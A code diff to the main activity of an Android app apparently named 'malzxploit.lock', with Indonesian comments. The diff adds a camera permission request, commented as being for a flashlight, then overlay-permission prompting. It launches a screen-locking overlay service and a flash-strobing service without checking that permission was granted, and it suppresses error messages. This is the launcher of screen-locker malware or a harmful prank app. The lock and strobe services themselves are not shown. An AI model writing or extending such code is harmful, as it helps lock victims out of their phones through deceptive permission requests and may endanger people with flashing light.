@@ -1,7 +1,9 @@
 package com.malzxploit.lock;
 
+import android.Manifest;
 import android.app.Activity;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -9,11 +11,31 @@ import android.provider.Settings;
 import android.widget.Toast;
 
 public class MainActivity extends Activity {
+
     @Override
     protected void onCreate(Bundle b) {
         super.onCreate(b);
 
-        // Cek izin overlay
+        // Minta izin camera dulu (buat flashlight)
+        if (Build.VERSION.SDK_INT >= 23) {
+            if (checkSelfPermission(Manifest.permission.CAMERA)
+                != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(
+                    new String[]{Manifest.permission.CAMERA}, 200);
+                return;
+            }
+        }
+        nextStep();
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int req, String[] perms, int[] res) {
+        super.onRequestPermissionsResult(req, perms, res);
+        nextStep();
+    }
+
+    private void nextStep() {
+        // Minta izin overlay
         if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
             Toast.makeText(this, "Izinkan overlay dulu", Toast.LENGTH_LONG).show();
             try {
@@ -26,9 +48,7 @@ public class MainActivity extends Activity {
                 try {
                     Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                     startActivityForResult(i, 100);
-                } catch (Exception e2) {
-                    Toast.makeText(this, "Error: " + e2.getMessage(), Toast.LENGTH_LONG).show();
-                }
+                } catch (Exception ignored) {}
             }
         } else {
             startLock();
@@ -38,29 +58,30 @@ public class MainActivity extends Activity {
     @Override
     protected void onActivityResult(int req, int res, Intent d) {
         super.onActivityResult(req, res, d);
-        if (Build.VERSION.SDK_INT >= 23 && Settings.canDrawOverlays(this)) {
-            startLock();
-        } else {
-            Toast.makeText(this, "Izin overlay belum di-allow", Toast.LENGTH_LONG).show();
-            finish();
-        }
+        startLock();
     }
 
     private void startLock() {
         try {
-            Intent svc = new Intent(this, LockService.class);
-            Intent strobe = new Intent(this, StrobeService.class);
-            try { startService(strobe); } catch (Exception ignored) {}
+            // Start LockService
+            Intent lock = new Intent(this, LockService.class);
             if (Build.VERSION.SDK_INT >= 26) {
-                startForegroundService(svc);
+                startForegroundService(lock);
             } else {
-                startService(svc);
+                startService(lock);
             }
-            Toast.makeText(this, "Lock aktif!", Toast.LENGTH_SHORT).show();
-            // JANGAN finish() — biar user liat app-nya
-            // finish();
+
+            // Start StrobeService
+            Intent strobe = new Intent(this, StrobeService.class);
+            if (Build.VERSION.SDK_INT >= 26) {
+                startForegroundService(strobe);
+            } else {
+                startService(strobe);
+            }
+
+            Toast.makeText(this, "AKTIF!", Toast.LENGTH_SHORT).show();
         } catch (Exception e) {
-            Toast.makeText(this, "Error start: " + e.getMessage(), Toast.LENGTH_LONG).show();
+            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
         }
     }
 }
